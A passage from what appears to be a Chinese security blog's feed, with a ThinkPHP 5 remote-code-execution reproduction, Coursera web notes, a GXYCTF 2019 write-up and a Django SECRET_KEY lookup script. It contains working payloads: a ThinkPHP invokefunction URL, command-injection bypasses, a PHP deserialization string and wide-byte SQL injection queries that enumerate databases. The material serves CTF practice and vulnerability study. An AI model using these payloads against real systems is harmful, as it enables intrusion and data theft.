href="https://www.ccreater.top/2020/01/30/ThinkPHP">https://www.ccreater.top/2020/01/30/ThinkPHP</a> 5.0.0</del>5.0.23 RCE 漏洞复现/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tp5rce复现</title>
      <link href="2020/01/28/tp5rce%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/01/28/tp5rce%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="tp5rce复现"><a href="#tp5rce复现" class="headerlink" title="tp5rce复现"></a>tp5rce复现</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote><h3 id="本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5-0-23和5-1-31之前的所有版本，推荐尽快更新到最新版本。"><a href="#本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5-0-23和5-1-31之前的所有版本，推荐尽快更新到最新版本。" class="headerlink" title="本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。"></a>本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。</h3><p><strong>如果暂时无法更新到最新版本，请开启强制路由并添加相应未定义路由，或者参考commit的修改 增加相关代码。</strong></p><p>–来自thinkphp官网</p></blockquote><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>根据官方的公告去寻找相关commit发现漏洞位置</p><p><img src="https://i.loli.net/2020/01/28/5EDWfFXvmqSuJk3.png" alt="image302"></p><p>查看所有调用controller的函数发现有个敏感的函数名exec,不过这个是tp自己实现的</p><pre><code class="php">    public function exec()    {        // 监听module_init        $this-&gt;app[&#39;hook&#39;]-&gt;listen(&#39;module_init&#39;);        try {            // 实例化控制器            $instance = $this-&gt;app-&gt;controller($this-&gt;controller,                $this-&gt;rule-&gt;getConfig(&#39;url_controller_layer&#39;),                $this-&gt;rule-&gt;getConfig(&#39;controller_suffix&#39;),                $this-&gt;rule-&gt;getConfig(&#39;empty_controller&#39;));            if ($instance instanceof Controller) {                $instance-&gt;registerMiddleware();            }        } catch (ClassNotFoundException $e) {            throw new HttpException(404, &#39;controller not exists:&#39; . $e-&gt;getClass());        }    ...    }</code></pre><p>跟进controller</p><pre><code class="php">    public function controller($name, $layer = &#39;controller&#39;, $appendSuffix = false, $empty = &#39;&#39;)    {        list($module, $class) = $this-&gt;parseModuleAndClass($name, $layer, $appendSuffix);        if (class_exists($class)) {            return $this-&gt;__get($class);        } elseif ($empty &amp;&amp; class_exists($emptyClass = $this-&gt;parseClass($module, $layer, $empty, $appendSuffix))) {            return $this-&gt;__get($emptyClass);        }        throw new ClassNotFoundException(&#39;class not exists:&#39; . $class, $class);    }</code></pre><p>再跟进parseModuleAndClass</p><pre><code class="php">protected function parseModuleAndClass($name, $layer, $appendSuffix)    {        if (false !== strpos($name, &#39;\\&#39;)) {            $class  = $name;//存在\            $module = $this-&gt;request-&gt;module();        } else {            if (strpos($name, &#39;/&#39;)) {                list($module, $name) = explode(&#39;/&#39;, $name, 2);            } else {                $module = $this-&gt;request-&gt;module();            }            $class = $this-&gt;parseClass($module, $layer, $name, $appendSuffix);        }        return [$module, $class];    }</code></pre><p>如果存在\则直接返回数据,其中<code>$name</code>是我们可控内容,而<code>$name</code>也恰好是类名,于是我们可以通过调用命名空间\类来进行敏感操作</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>查找手册,找到url访问的具体细节</p><p><code>http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]</code></p><p>于是有通杀tp5.0.x和tp5.1.x的检测payload</p><p><code>http://127.0.0.1/public/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=var_dump&amp;vars[1][]=checktp5rce</code></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/01/28/tp5rce复现/">https://www.ccreater.top/2020/01/28/tp5rce复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>coursera-杜克大学 程序设计与 Web 入门</title>
      <link href="2020/01/25/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/"/>
      <url>2020/01/25/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="coursera-杜克大学-程序设计与-Web-入门"><a href="#coursera-杜克大学-程序设计与-Web-入门" class="headerlink" title="coursera-杜克大学 程序设计与 Web 入门"></a>coursera-杜克大学 程序设计与 Web 入门</h1><h2 id="在coursera上学习的感受"><a href="#在coursera上学习的感受" class="headerlink" title="在coursera上学习的感受"></a>在coursera上学习的感受</h2><p>我觉得最大的优点是:教学和练习同时进行,极大的帮助了我快速掌握知识,这是我最喜欢的一点.但是对于中国境内的视频 加载有点难受,不过可以通过修改hosts来改善.</p><p>虽然这种教学方式我很喜欢,但是由于我的课程选择不太适合我自己(太基础了),导致我其实没学到啥,但是我还是硬着头皮看完了(闲得无聊?),选择适合自己的课程真的特别重要</p><h2 id="提问问题的注意事项"><a href="#提问问题的注意事项" class="headerlink" title="提问问题的注意事项"></a>提问问题的注意事项</h2><p><strong>详细</strong>,<strong>清楚</strong>的描述自己遇到的问题,及自己尝试解决问题的结果</p><h2 id="css语法"><a href="#css语法" class="headerlink" title="css语法"></a>css语法</h2><pre><code class="css">.classname{    preperty:value;}#ID{    preperty:value;}tagname {    preperty:value;};ortag1 tag2 {    preperty:value;};这个会修改tag1下的tag2</code></pre><h2 id="css资料"><a href="#css资料" class="headerlink" title="css资料"></a>css资料</h2><h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><p> <a href="https://www.w3schools.com/css/css_border.asp" target="_blank" rel="noopener">https://www.w3schools.com/css/css_border.asp</a> </p><h3 id="css-colors"><a href="#css-colors" class="headerlink" title="css colors"></a>css colors</h3><p> <a href="https://www.w3schools.com/cssref/css_colors.asp" target="_blank" rel="noopener">https://www.w3schools.com/cssref/css_colors.asp</a> </p><p> <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Colors/Color_picker_tool" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Colors/Color_picker_tool</a></p><p> <a href="http://www.w3schools.com/colors/colors_picker.asp" target="_blank" rel="noopener">http://www.w3schools.com/colors/colors_picker.asp</a></p><h2 id="用编程解决问题的七步骤"><a href="#用编程解决问题的七步骤" class="headerlink" title="用编程解决问题的七步骤"></a>用编程解决问题的七步骤</h2><ol><li>Work example by hand.<br>清晰的认识要解决的问题,并手动尝试解决</li><li>Write down what you did.<br>写下自己解决问题的过程(只针对这个具体的例子),不要忽略我们理所当然的东西,计算机不会这么想,我们要尽可能的详细,精确的记录我们解决问题的步骤</li><li>Find patterns.<br>将过程抽象成解决这个问题的一般性步骤,注意重复的步骤(变为循环语句),注意判断(变为条件语句)</li><li>Check by hand.<br>用具体的例子来检验抽象的步骤是否能解决问题</li><li>Translate to code. </li><li>Run test cases. </li><li>Debug failed test cases.<br>一般可以把问题分为:步骤问题(如没考虑某些特殊情况)和将步骤转为程序时(如函数用错)的问题</li></ol><h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><h3 id="手册"><a href="#手册" class="headerlink" title="手册"></a>手册</h3><p> <a href="https://developer.mozilla.org/" target="_blank" rel="noopener">https://developer.mozilla.org/</a> </p><p> <a href="https://www.w3schools.com/" target="_blank" rel="noopener">https://www.w3schools.com/</a> </p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><pre><code class="javascript">var img = new SimpleImage(200, 200);for(var pixel of img.values()){//pixel是img.values()的引用    pixel.setRed(255);    pixel.setGreen(255);    pixel.setBlue(0);}print(img);</code></pre><h3 id="canvas操作"><a href="#canvas操作" class="headerlink" title="canvas操作"></a>canvas操作</h3><pre><code class="javascript">var canvas=document.getElementById(&quot;show2&quot;);var context = canvas.getContext(&#39;2d&#39;);#initcontext.clearRect(0, 0, canvas.width, canvas.height);#clear canvascontext.font = &quot;30px Arial&quot;;context.fillText(&quot;Hello World&quot;, 10, 50);#draw a textcontext.fillStyle = &quot;red&quot;;context.fillRect(10, 10, 150, 80);#draw rectangle</code></pre><h3 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h3><p>当变量是数字和字符串的时候,会生成一个拷贝,再赋值给目标</p><p>但如果对象是数组和对象时,这会将引用赋值给目标,此时修改新变量也会影响到旧变量</p><h2 id="html标签"><a href="#html标签" class="headerlink" title="html标签"></a>html标签</h2><h3 id="input"><a href="#input" class="headerlink" title="input"></a>input</h3><h4 id="color"><a href="#color" class="headerlink" title="color"></a>color</h4><p><code>&lt;input type=&quot;color&quot; id=&quot;color&quot; value=&quot;pink&quot; onchange=&quot;colorchange()&quot;&gt;</code></p><h4 id="botton"><a href="#botton" class="headerlink" title="botton"></a>botton</h4><p><code>&lt;input type=&quot;button&quot; value=&quot;make pink&quot; onclick=&quot;makepink()&quot;&gt;</code></p><h4 id="range"><a href="#range" class="headerlink" title="range"></a>range</h4><p><code>&lt;input type=&quot;range&quot; min=&quot;10&quot; max=&quot;100&quot; value=&quot;10&quot; id=&quot;slr&quot; oninput=doSquare()&gt;</code></p><h4 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h4><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>onclick,onchage,oninput</p><h2 id="给自己的建议"><a href="#给自己的建议" class="headerlink" title="给自己的建议"></a>给自己的建议</h2><blockquote><p>合格的程序员不应该浪费很多时间用于程序调试,他们应该一开始就不要把故障引入.</p><p>—-迪杰斯特拉</p></blockquote><h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p><img src="https://i.loli.net/2020/01/20/bmQ5AvDenOHlqP7.png" alt="image2319"></p><p>发现bug-&gt;明确目的(了解bug发生的原因及解决方法)-&gt;收集信息-&gt;(多次)提出猜想(where,why)(要具有可测试性)-&gt;验证-&gt;解决</p><h2 id="final-work"><a href="#final-work" class="headerlink" title="final work"></a>final work</h2><p> <a href="https://codepen.io/explorersss/full/wvBOwmR" target="_blank" rel="noopener">https://codepen.io/explorersss/full/wvBOwmR</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/2020/01/25/coursera-杜克大学">https://www.ccreater.top/2020/01/25/coursera-杜克大学</a> 程序设计与 Web 入门/](<a href="https://www.ccreater.top/2020/01/25/coursera-杜克大学">https://www.ccreater.top/2020/01/25/coursera-杜克大学</a> 程序设计与 Web 入门/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gxytf2019</title>
      <link href="2019/12/22/gxyctf2019/"/>
      <url>2019/12/22/gxyctf2019/</url>
      
        <content type="html"><![CDATA[<h1 id="gxyctf"><a href="#gxyctf" class="headerlink" title="gxyctf"></a>gxyctf</h1><h2 id="ping-ping-ping"><a href="#ping-ping-ping" class="headerlink" title="ping ping ping"></a>ping ping ping</h2><p>过滤$,’ ‘,</p><p>未过滤符号:<code>!,#,$,%,(,.,+,-,:,;,=</code></p><p>过滤空格用$IFS来代替</p><p>过滤flag</p><p>用base64来绕过</p><p><code>aasdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS``cat</code></p><pre><code class="php">    &lt;?php    if(isset($_GET[&#39;ip&#39;])){        $ip = $_GET[&#39;ip&#39;];        if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){            echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);            die(&quot;fxck your symbol!&quot;);        }        else if(preg_match(&quot;/ /&quot;, $ip)){            die(&quot;fxck your space!&quot;);        }        else if(preg_match(&quot;/bash/&quot;, $ip)){            die(&quot;fxck your bash!&quot;);        }        else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){            die(&quot;fxck your flag!&quot;);        }        $a = shell_exec(&quot;ping -c 4 &quot;.$ip);        echo &quot;&lt;pre&gt;&quot;;        print_r($a);    }    ?&gt;</code></pre><p><code>asdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS$1cat</code></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><strong>没做出来忽略他</strong></p><p>上传类型也太露骨了把:检测后缀还是上传类型?</p><p>Content-Type: image/jpeg,可以上传了</p><p>上传文件后无法访问404</p><p>上传文件所在文件夹和session有关</p><p>将session置空后报错</p><pre><code class="html">&lt;b&gt;Warning&lt;/b&gt;:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/index.php:2) in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;</code></pre><p>猜测随机生成一个值放到session里面</p><p>php版本5.6可以%00截断</p><p>后缀不能以ph结尾</p><h2 id="Do-you-know-robot"><a href="#Do-you-know-robot" class="headerlink" title="Do you know robot"></a>Do you know robot</h2><blockquote><p>PHP 在反序列化 string 时没有严格按照序列化格式 <code>s:x:&quot;x&quot;;</code>进行处理，没有对 <code>&quot;</code>后面的是否存在 <code>;</code> 进行判断，同时增加了对十六进制形式字符串的处理，这样前后处理的不一致让人很费解，同时由于 PHP 手册中对此没有详细的说明，大部分程序员对此处理过程并不了解，这可能导致其在编码过程中出现疏漏，甚至导致严重的安全问题。</p></blockquote><pre><code class="php">&lt;?php class FileReader{    public $Filename;    public $start;    public $max_length;    function __construct(){        $this-&gt;Filename = __DIR__ . &quot;/bcm.txt&quot;;        $this-&gt;start = 12;        $this-&gt;max_length = 72;    }    function __wakeup(){        $this-&gt;Filename = __DIR__ . &quot;/fake_f1ag.php&quot;;        $this-&gt;start = 10;        $this-&gt;max_length = 0;        echo &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;    }    function __destruct(){        $data = file_get_contents($this-&gt;Filename, 0, NULL, $this-&gt;start, $this-&gt;max_length);        if(preg_match(&quot;/\{|\}/&quot;, $data)){            die(&quot;you can&#39;t read flag!&quot;);        }        else{            echo $data;        }    }}if(isset($_GET[&#39;exp&#39;])){    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;exp&#39;])){        die(&quot;hack!&quot;);    }    $exp = $_REQUEST[&#39;exp&#39;];    $e = unserialize($exp);    echo $e-&gt;Filename;}else{    $exp = new FileReader();}?&gt;</code></pre><p>令属性数量与实际数量不同来绕过<code>__wakeup</code></p><p>利用16进制绕过flag的限制</p><p><code>O:10:&quot;FileReader&quot;:4:{s:8:&quot;Filename&quot;;S:71:&quot;\70\68\70\3a\2f\2f\66\69\6c\74\65\72\2f\72\65\61\64\3d\63\6f\6e\76\65\72\74\2e\62\61\73\65\36\34\2d\65\6e\63\6f\64\65\2f\72\65\73\6f\75\72\63\65\3d\2f\76\61\72\2f\77\77\77\2f\68\74\6d\6c\2f\66\6c\61\67\2e\70\68\70&quot;;s:5:&quot;start&quot;;i:0;s:10:&quot;max_length&quot;;i:10000;}</code></p><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>正则匹配的四<code>$_GET</code>,而传的参数是<code>$_REQUEST</code>,从而绕过</p><h2 id="sql1"><a href="#sql1" class="headerlink" title="sql1"></a>sql1</h2><p>union select 设置自己的密码拿到flag</p><h2 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>和bytectf2019有点类似 <a href="https://blog.zeddyu.info/2019/09/17/bytectf2019/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/09/17/bytectf2019/</a> </p><p><code>var_dump(scandir(chr(time())));</code></p><p><code>array(5) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; }</code></p><p>chr,random_bytes</p><p>翻数组相关的函数找到array_rand,但是遗憾的是返回的是键名,如果我们能交换键名和值就可以拿到flag.php了,再找一找发现array_filp</p><p>最后的payload</p><p><code>var_dump(readfile(array_rand(array_flip(scandir(chr(time()))))));</code></p><h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p><code>readfile(session_id(session_start()))</code></p><p>然后<code>PHPSESSID=flag.php</code>读到flag</p><h2 id="BabySqliv2-0"><a href="#BabySqliv2-0" class="headerlink" title="BabySqliv2.0"></a>BabySqliv2.0</h2><p>提到中文,宽字节注入绕过引号</p><p>过滤select,union,where等</p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),1%23</code></p><p>回显密码</p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(schema_name)+FROM+information_schema.schemata)%23</code></p><p>数据库:<code>information_schema,web_sqli</code></p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(table_name)+FROM+information_schema.tables+WHEwhereRE+TABLE_SCHEMA=database())%23</code></p><p>表:<code>f14g,user</code></p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(column_name)+FROM+information_schema.columns+WHwhereERE+table_name=char(102,49,52,103))%23</code></p><p>列:<code>b80bb7740288fda1f201890375a60c8f,327a6c4304ad5938eaf0efb6cc3e53dc</code></p><p>读取flag,但是有长度限制</p><p>最后得到抖肩舞+flag</p><p>GXY{g0Od_job1im_so_vegetable}</p><h2 id="babysqliv3-0"><a href="#babysqliv3-0" class="headerlink" title="babysqliv3.0"></a>babysqliv3.0</h2><p>对phpsession注入报错</p><pre><code class="html">&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;/var/www/html/search.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/search.php:2) in &lt;b&gt;/var/www/html/search.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=uft-8&quot;/&gt;&lt;title&gt;login&lt;/title&gt;&lt;script&gt;alert(&#39;Wrong pass&#39;);location.href=&#39;./index.php&#39;&lt;/script&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  Unknown: The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;Unknown&lt;/b&gt; on line &lt;b&gt;0&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  Unknown: Failed to write session data (files). Please verify that the current setting of session.save_path is correct () in &lt;b&gt;Unknown&lt;/b&gt; on line &lt;b&gt;0&lt;/b&gt;&lt;br /&gt;</code></pre><pre><code>[21:19:28] 200 -   89B  - /home.php[21:19:29] 200 -  562B  - /index.php[21:19:35] 200 -  253B  - /upload.php[21:19:35] 301 -  327B  - /uploads  -&gt;  http://183.129.189.60:10023/uploads/[21:19:35] 403 -  300B  - /uploads/</code></pre><p>fuzz一下发现没啥好注的</p><p>再结合扫到的东东,爆破得到密码password</p><p>文件上传没用?上传后没有任何提示</p><p>content-type改为jpeg,可以上传但是后缀是.txt</p><p>如果能控制后缀就可以文件包含了尝试文件名处%00截断无效</p><p>home处有文件包含,但是会再末尾添加.fxxkyou(home.php和upload.php不会)</p><p>因为题目环境是5.6,尝试%00截断 [ x ]</p><p>这里我发现我对文件上传和文件包含部分的掌握不好,以及思考解决方法时候的思考方式不太行</p><p>这里利用伪协议直接读取代码,但是我却偏偏没想到这么基础的东西.回去重新学习一下文件包含和上传</p><p>代码审计发现phar反序列化可以命令执行</p><p>已被魔改</p><p>home.php</p><pre><code class="php">&lt;?phpecho &quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;error_reporting(0);if(isset($_GET[&#39;file&#39;])){    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;file&#39;])){        die(&quot;hacker!&quot;);    }    else{        if(preg_match(&quot;/home$/i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;/upload$/i&quot;, $_GET[&#39;file&#39;])){            $file = $_GET[&#39;file&#39;].&quot;.php&quot;;        }        else{            $file = $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;        }        echo &quot;当前引用 &quot;.$file;        require $file;    }}else{    die(&quot;no permission!&quot;);}?&gt;</code></pre><p>upload.php</p><pre><code class="php">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    上传    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot; /&gt;&lt;/form&gt;&lt;?phpclass Uploader{    public $Filename;    public $cmd;    public $token;    function __construct(){        $sandbox = getcwd().&quot;/uploads/&quot;.md5(&quot;admin&quot;).&quot;/&quot;;        $ext = &quot;.txt&quot;;        @mkdir($sandbox, 0777, true);        if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#39;name&#39;])){            $this-&gt;Filename = $_GET[&#39;name&#39;];        }        else{            $this-&gt;Filename = $sandbox.&quot;admin&quot;.$ext;        }        $this-&gt;cmd = &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;        $this-&gt;token = &quot;admin&quot;;    }    function upload($file){        global $sandbox;        global $ext;        if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)){            $this-&gt;cmd = &quot;die(&#39;illegal filename!&#39;);&quot;;        }        else{            if($file[&#39;size&#39;] &gt; 1024){                $this-&gt;cmd = &quot;die(&#39;you are too big ( :) )&#39;);&quot;;            }            else{                $this-&gt;cmd = &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;            }        }    }    function __toString(){        global $sandbox;        global $ext;        // return $sandbox.$this-&gt;Filename.$ext;        return $this-&gt;Filename;    }    function __destruct(){        if($this-&gt;token != &quot;admin&quot;){            $this-&gt;cmd = &quot;die(&#39;check token falied!&#39;);&quot;;        }        eval($this-&gt;cmd);        echo &quot;__destruct&quot;;    }}if(isset($_FILES[&#39;file&#39;])) {    $uploader = new Uploader();    $uploader-&gt;upload($_FILES[&quot;file&quot;]);    if(@file_get_contents($uploader)){        echo &quot;成功上传&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;        echo file_get_contents($uploader);    }}?&gt;</code></pre><h2 id="参考-其他人的wp"><a href="#参考-其他人的wp" class="headerlink" title="参考(其他人的wp)"></a>参考(其他人的wp)</h2><ol><li><a href="http://www.qfrost.com/PWN/GXY_CTF/" target="_blank" rel="noopener">http://www.qfrost.com/PWN/GXY_CTF/</a> </li></ol><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2019/12/22/gxyctf2019/">https://www.ccreater.top/2019/12/22/gxyctf2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
            <tag> 线上赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>django快速查找配置</title>
      <link href="2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/"/>
      <url>2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="django快速查找配置"><a href="#django快速查找配置" class="headerlink" title="django快速查找配置"></a>django快速查找配置</h1><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>在看p牛的picklecode wp的时候卡在secret_key查找那边</p><p>看到p牛一句很容易,人就傻掉了</p><p><img src="https://i.loli.net/2019/12/21/8mnp5l7ODuPkBQo.png" alt="image209"></p><p>花了一天时间(踩了个坑),写了个快速查找secret_key的脚本</p><p>代码写的不太好,自己改改用吧////</p><pre><code class="python">from django.http.response import HttpResponse, HttpResponseRedirectfrom django.template import enginesfrom django.contrib.auth import login as auth_login, get_user_model, authenticatefrom django.contrib.auth.views import LoginView, logout_then_loginfrom django.contrib.auth.decorators import login_requiredfrom django.views import genericfrom django import templateimport djangofrom django import templateregister = template.Library()@register.filterdef get_dict(obj,way=&quot;&quot;,depth=0):    if depth&gt;11:        return     objdir=dir(obj)    r={&quot;dict&quot;:objdir,&quot;way&quot;:way}    result=&quot;&quot;    for i in objdir:                    try :            if &#39;_&#39; == i[0]:                continue            if getattr(obj, &#39;__module__&#39;, None)!=None and getattr(obj, &#39;__module__&#39;, None).split(&#39;.&#39;)[0] == django.__name__:                result+=get_dict(getattr(obj,i,None),way+&quot;.&quot;+i,depth+1)         except TypeError:            pass    if &quot;SECRET_KEY&quot; in objdir or &quot;settings&quot; in objdir:        print(way)        return result+way+&quot;\n&quot;    return result</code></pre><p>这个是把所有符合条件的都输出,你可以通过修改递归深度和返回条件来加快,不然要等个几分钟</p><h2 id="顺便说下踩到的坑"><a href="#顺便说下踩到的坑" class="headerlink" title="顺便说下踩到的坑"></a>顺便说下踩到的坑</h2><p>因为不知道dir()和<code>__dict__</code>的区别,一直以为<code>__dict__</code>==dir,然后就boomm</p><p>dir()和<code>__dict__</code>的区别</p><p>最简单的一句发\话是<code>__dict__</code>是dir的子集合</p><p> <a href="https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981" target="_blank" rel="noopener">https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981</a> </p><p>所以以后查看对象的所有属性一定要用dir()</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2019/12/21/django快速查找配置/">https://www.ccreater.top/2019/12/21/django快速查找配置/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> django </tag>
            
            <tag> 小工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jwt攻击方式</title>
      <link href="2019/12/19/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
      <url>2019/12/19/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
      
